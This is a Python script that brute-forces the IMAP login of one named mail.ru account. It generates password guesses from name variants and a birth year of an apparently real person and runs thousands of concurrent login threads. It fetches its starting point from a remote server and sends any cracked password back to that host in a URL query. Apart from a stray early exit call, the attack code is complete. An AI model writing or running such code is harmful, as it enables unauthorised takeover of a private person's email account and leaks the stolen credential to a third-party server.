import sys,time,socket
import imapclient
import random
import threading
import os,requests

found = set()
pooll = set()
sys.exit()
for n in range(10):
    spns = False
    try :
        spns = requests.get("https://ziguas.pserver.ru/bcon/mail_blo/text.txt", timeout=60).text
    except:
        pass
    if spns:
        break
vase = int(spns.strip())
def bcdechex(dec):  
    keyspace = ["GuwanchmyratOrazow", "Guwanchmyrat", "Orazow", "Myrat", "Guwanch", "Guwanc", "Murat", "Orazov", "Guvanch", "Guvanc", "GuvanchmyratOrazow", "Guvanchmyrat", "GuvanchmyratOrazov", "guwanchmyratOrazow", "guwanchmyrat", "orazow", "myrat", "guwanch", "guwanc", "murat", "orazov", "guvanch", "guvanc", "guvanchmyratOrazow", "guvanchmyrat", "guvanchmyratOrazov", "Kwanch", "Kwanc", "Kvanch", "Kvanc", "kwanch", "kwanc", "kvanch", "kvanc", "1993", "93", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "-", "_"] #"0123456789-_charydinyewvmCHARYDINYEWVM"
    hexin = ''
    while(dec>0):   
        last = dec % len(keyspace)
        hexin = hexin+""+keyspace[last]
        dec = dec//len(keyspace)  
    return hexin


def fill_pooll(no):
    global pooll
    global vase
    try :
        spns = requests.get("https://ziguas.pserver.ru/bcon/mail_blo/?id="+str(vase), timeout=60)
    except:
        pass
    for x in range(no):
        line = bcdechex(vase)
        pooll.add(line)
        vase += 1
        
def checkin(c):
    global pooll
    global found
    try : 
        password = random.sample(pooll, 1)[0]
        server = imapclient.IMAPClient("imap.mail.ru", port=993, use_uid=True, ssl=True, timeout=20)
        server.login("orazow_1993@mail.ru", password)
        print(" +++ Password found  : %s ", password ) 
        found.add(password)
    except imapclient.exceptions.LoginError:
        if (c-len(pooll)) % 1000 == 0:
            print("{:,} {:,} {}".format(c,c-len(pooll),password))
        if password in pooll:
            pooll.remove(password)
    except socket.timeout:
        pass
    except ConnectionResetError:
        pass
    except socket.gaierror:
        pass
    except ValueError:
        print("pool empty")
        pass

while len(found)<1:
    if len(pooll) == 0:
        fill_pooll(100000)
    if threading.active_count() < 20024:
        threading.Thread(target = checkin , args = (vase,)).start()



while True:
    if 2 > threading.active_count():
        print("Found")
        print(found)
        try:
            respns = requests.get("https://ziguas.pserver.ru/bcon/?id="+str(found), timeout=60)
        except:
            pass
        break
